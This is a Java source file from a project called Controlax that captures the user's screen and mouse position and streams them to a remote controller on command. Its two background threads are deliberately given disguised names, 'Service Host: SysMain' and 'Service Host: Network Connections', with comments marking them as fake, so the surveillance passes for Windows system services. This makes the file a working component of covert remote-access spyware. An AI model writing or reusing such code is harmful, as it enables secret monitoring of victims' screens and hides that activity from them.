package com.khopan.controlax;

import java.awt.Graphics2D;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import javax.imageio.ImageIO;

import com.khopan.controlax.packet.HeaderedImagePacket;
import com.khopan.lazel.config.BinaryConfigObject;
import com.khopan.lazel.packet.BinaryConfigPacket;

public class ImageProcessor {
	public static final byte SCREENSHOT_HEADER = 0x21;
	public static final byte STREAM_HEADER = 0x5F;

	private static volatile boolean StreamStart;
	private static BufferedImage CursorImage;
	private static long FrameTimeMs;
	private static int PreviousMouseX;
	private static int PreviousMouseY;

	static {
		Thread streamThread = new Thread(() -> {
			while(true) {
				if(ImageProcessor.StreamStart) {
					try {
						HeaderedImagePacket packet = new HeaderedImagePacket(ImageProcessor.takeScreenshot(), ImageProcessor.STREAM_HEADER);
						Controlax.INSTANCE.processor.sendPacket(packet);
						Thread.sleep(ImageProcessor.FrameTimeMs);
					} catch(Throwable Errors) {
						Errors.printStackTrace();
					}
				}
			}
		});

		Thread mouseCursorThread = new Thread(() -> {
			while(true) {
				if(ImageProcessor.StreamStart) {
					try {
						Point location = MouseInfo.getPointerInfo().getLocation();

						if(location.x != ImageProcessor.PreviousMouseX || location.y != ImageProcessor.PreviousMouseY) {
							BinaryConfigObject config = new BinaryConfigObject();
							config.putInt("Action", 4);
							config.putInt("MouseX", location.x);
							config.putInt("MouseY", location.y);
							Controlax.INSTANCE.processor.sendPacket(new BinaryConfigPacket(config));
							ImageProcessor.PreviousMouseX = location.x;
							ImageProcessor.PreviousMouseY = location.y;
						}

						Thread.sleep(ImageProcessor.FrameTimeMs);
					} catch(Throwable Errors) {
						Errors.printStackTrace();
					}
				}
			}
		});

		streamThread.setPriority(7);
		mouseCursorThread.setPriority(7);
		streamThread.setName("Service Host: SysMain"); // FAKE NAME
		mouseCursorThread.setName("Service Host: Network Connections"); // FAKE NAME
		streamThread.start();
		mouseCursorThread.start();
	}

	public static void processScreenshot() {
		HeaderedImagePacket packet = new HeaderedImagePacket(ImageProcessor.takeScreenshot(), ImageProcessor.SCREENSHOT_HEADER);
		Controlax.INSTANCE.processor.sendPacket(packet);
	}

	public static void processStream(BinaryConfigObject config) {
		boolean start = config.getBoolean("Start");

		if(start) {
			int framerate = Math.min(config.getInt("Framerate"), Controlax.getFramerate());
			ImageProcessor.FrameTimeMs = Math.round(1000.0d / ((double) framerate));
		}

		ImageProcessor.StreamStart = start;
	}

	private static BufferedImage takeScreenshot() {
		Rectangle area = new Rectangle();
		area.x = area.y = 0;
		area.setSize(Toolkit.getDefaultToolkit().getScreenSize());
		double average = (int) Math.round((((double) area.width) + ((double) area.height)) * 0.5d);
		Point mouse = MouseInfo.getPointerInfo().getLocation();
		BufferedImage image = Controlax.INSTANCE.robot.createScreenCapture(area);
		Graphics2D Graphics = image.createGraphics();
		Graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
		Graphics.drawImage(ImageProcessor.CursorImage.getScaledInstance((int) Math.round(average * 0.0112464855d), (int) Math.round(average * 0.0178069353d), BufferedImage.SCALE_SMOOTH), mouse.x, mouse.y, null);
		Graphics.dispose();
		return image;
	}

	public static void load() {
		try {
			ImageProcessor.CursorImage = ImageIO.read(ImageProcessor.class.getResource("cursor.png"));
		} catch(Throwable Errors) {
			Errors.printStackTrace();
		}
	}
}
